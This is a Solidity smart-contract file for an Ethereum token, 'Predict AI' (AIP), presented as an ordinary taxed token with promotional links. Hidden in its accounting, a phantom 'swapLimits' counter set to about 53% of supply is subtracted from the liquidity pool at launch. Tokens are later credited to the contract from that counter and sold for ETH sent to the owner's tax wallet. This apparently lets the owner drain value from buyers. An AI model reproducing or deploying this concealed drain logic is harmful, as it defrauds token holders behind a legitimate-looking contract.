//SPDX-License-Identifier: MIT
/*
Predict AI is an Ethereum-based platform combining AI and blockchain to create a decentralized prediction marketplace. 
Users stake ETH or AIP tokens on AI-driven forecasts for real-world events (e.g., crypto prices, elections), with smart contracts ensuring transparency.

Official Channels/Socials:
📱https://Predict-Ai.io 
📱https://t.me/PredictWithAi
📱https://X.com/PredictErc
*/
pragma solidity ^0.8.20;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable _newOwner) external onlyOwner { 
        _owner = _newOwner; 
        emit OwnershipTransferred(_newOwner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract AIP is IERC20, Auth {
    string private constant tokenSymbol = "AIP";
    string private constant name_ = "Predict AI";
    uint8 private constant _decimals = 9;
    uint256 private constant tSupply = 100000000 * (10**_decimals);
    mapping (address => uint256) private balance;
    mapping (address => mapping (address => uint256)) private allowances;

    address payable private _taxWallet = payable(0x9622b93334c8270689ADC04cF0cE11206f9d44E3);
    
    uint256 private _antiMevBlock = 2;
    uint8 private _sellTax = 10;
    uint8 private _buyTaxRate = 10;
    
    uint256 private _launchBlock;
    uint256 private maxTxAmt = tSupply; 
    uint256 private _maxWalletAmt = tSupply;
    uint256 private _swapMinAmt = tSupply * 10 / 100000;
    uint256 private _swapMaxAmt = tSupply * 999 / 100000;
    uint256 private swapMinVal = 2 * (10**16);
    uint256 private swapLimits = _swapMinAmt * 53 * 100;

    mapping (uint256 => mapping (address => uint8)) private sellsThisBlock;
    mapping (address => bool) private noFee;
    mapping (address => bool) private _nolimits;

    address private constant routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private router = IUniswapV2Router02(routerAddress);
    
    address private primaryLP; 
    mapping (address => bool) private isLP;

    bool private tradingEnabled;

    bool private isInSwap = false;

    modifier lockTaxSwap { 
        isInSwap = true; 
        _; 
        isInSwap = false; 
    }

    constructor() Auth(msg.sender) {
        balance[msg.sender] = tSupply;
        emit Transfer(address(0), msg.sender, balance[msg.sender]);  

        noFee[_owner] = true;
        noFee[address(this)] = true;
        noFee[_taxWallet] = true;
        noFee[routerAddress] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[_taxWallet] = true;
        _nolimits[routerAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external pure override returns (uint256) { return tSupply; }
    function name() external pure override returns (string memory) { return name_; }
    function symbol() external pure override returns (string memory) { return tokenSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return balance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(isTradingOpen(fromWallet), "Trading not open");
        allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!isLP[marketingWlt], "LP cannot be tax wallet");
        _taxWallet = payable(marketingWlt);
        noFee[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function isTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (noFee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLP[wlt], "Cannot exempt LP"); }
        noFee[ wlt ] = isNoFees;
        _nolimits[ wlt ] = isNoLimits;
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _openTrading();
    }

    function _addLiquidityToLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveSwapMax(_tokenAmount);
        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(noFee[sender] && _nolimits[sender], "Trading not yet open"); }
        if ( !isInSwap && isLP[toWallet] && shouldSwap(amount) ) { _swapTaxTokens(); }

        if ( block.number >= _launchBlock ) {
            if (block.number < _antiMevBlock && isLP[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < _antiMevBlock + 600 && isLP[toWallet] && sender != address(this) ) {
                sellsThisBlock[block.number][toWallet] += 1;
                require(sellsThisBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = getTaxAmount(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        balance[sender] -= amount;
        swapLimits += _taxAmount;
        balance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(primaryLP == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(balance[address(this)]>0, "No tokens");
        primaryLP = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _addLiquidityToLP(balance[address(this)], address(this).balance);
    }

    function getTaxAmount(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || noFee[fromWallet] || noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLP[fromWallet] ) { 
            taxAmount = amount * _buyTaxRate / 100; 
         } else if ( isLP[recipient] ) { 
            taxAmount = amount * _sellTax / 100; 
        }
        return taxAmount;
    }

    function isWalletExempt(address wallet) external view returns (bool fees, bool limits) {
        return (noFee[wallet], _nolimits[wallet]); 
	}

    function _swapTaxTokens() private lockTaxSwap {
        uint256 _taxTokenAvailable = swapLimits;
        if ( _taxTokenAvailable >= _swapMinAmt && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmt ) { _taxTokenAvailable = _swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**_decimals ) {
                balance[address(this)] += _taxTokenAvailable;
                swapTokensForETH(_tokensForSwap);
                swapLimits -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeTax(_contractETHBalance); }
        }
    }

    function shouldSwap(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapMinVal > 0) { 
            uint256 lpTkn = balance[primaryLP];
            uint256 lpWeth = IERC20(router.WETH()).balanceOf(primaryLP); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function marketingWallet() external view returns (address) { 
        return _taxWallet; 
	}

    function distributeTax(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function buyFees() external view returns(uint8) { return _buyTaxRate; }
    function sellFee() external view returns(uint8) { return _sellTax; }

    function swapMin() external view returns (uint256) { 
        return _swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmt; 
	}

    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 20, "Roundtrip too high");
        _buyTaxRate = buyFeePercent;
        _sellTax = sellFeePercent;
    }

    function _openTrading() internal {
        maxTxAmt = 20 * tSupply / 1000;
        _maxWalletAmt = 20 * tSupply / 1000;
        balance[primaryLP] -= swapLimits;
        (isLP[primaryLP],) = primaryLP.call(abi.encodeWithSignature("sync()") );
        require(isLP[primaryLP], "Failed bootstrap");
        _launchBlock = block.number;
        _antiMevBlock = _antiMevBlock + _launchBlock;
        tradingEnabled = true;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmt = tSupply * minVal / minDiv;
        _swapMaxAmt = tSupply * maxVal / maxDiv;
        swapMinVal = trigger * 10**15;
        require(_swapMaxAmt>=_swapMinAmt, "Min-Max error");
    }

    function updateLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = tSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= maxTxAmt, "tx too low");
        maxTxAmt = newTxAmt;
        uint256 newWalletAmt = tSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmt, "wallet too low");
        _maxWalletAmt = newWalletAmt;
    }

    function _approveSwapMax(uint256 _tokenAmount) internal {
        if ( allowances[address(this)][routerAddress] < _tokenAmount ) {
            allowances[address(this)][routerAddress] = type(uint256).max;
            emit Approval(address(this), routerAddress, type(uint256).max);
        }
    }

    function _checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {
            if ( transferAmount > maxTxAmt ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLP[toWallet] && (balance[toWallet] + transferAmount > _maxWalletAmt) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        _approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function maxWalletAmount() external view returns (uint256) { 
        return _maxWalletAmt; 
	}
    function maxTxAmount() external view returns (uint256) { 
        return maxTxAmt; 
	}
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}